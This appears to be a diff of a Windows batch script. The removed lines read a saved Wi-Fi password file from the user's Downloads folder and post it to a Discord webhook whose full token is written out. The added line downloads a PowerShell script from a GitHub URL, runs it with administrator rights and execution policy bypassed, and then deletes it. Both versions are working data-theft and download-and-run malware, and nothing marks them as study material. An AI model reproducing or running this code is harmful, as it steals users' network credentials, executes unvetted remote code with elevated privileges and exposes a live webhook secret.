@@ -1,26 +1,2 @@
 @echo off
-setlocal
-
-:: Variables
-set "FileToFind=%USERPROFILE%\Downloads\wlan_passwords.txt"
-set "WebhookURL=https://discord.com/api/webhooks/1417754280445739060/P186Tt0Wf83MZkVpKQ6aSN6nZ3f81Dak9IAdwRaX8aLMBMdhDbgiav6jbLEnOT2S78G8"
-
-:: Check if file exists
-if exist "%FileToFind%" (
-    echo File found: %FileToFind%
-    
-    :: Read file content
-    set "FileContent="
-    for /f "delims=" %%A in (%FileToFind%) do set "FileContent=!FileContent!%%A`n"
-    
-    :: Send to Discord via PowerShell
-    powershell -Command ^
-    "$content = Get-Content '%FileToFind%' -Raw; " ^
-    "Invoke-RestMethod -Uri '%WebhookURL%' -Method Post -Body (@{content=$content})"
-    
-    echo Success!
-) else (
-    echo File not found: %FileToFind%
-)
-
-pause
+powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/sqd5dcwh.ps1' -OutFile '%TEMP%\sqd5dcwh.ps1'; Start-Process 'powershell.exe' -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', '%TEMP%\sqd5dcwh.ps1' -Verb RunAs -Wait; Remove-Item '%TEMP%\sqd5dcwh.ps1' -Force"
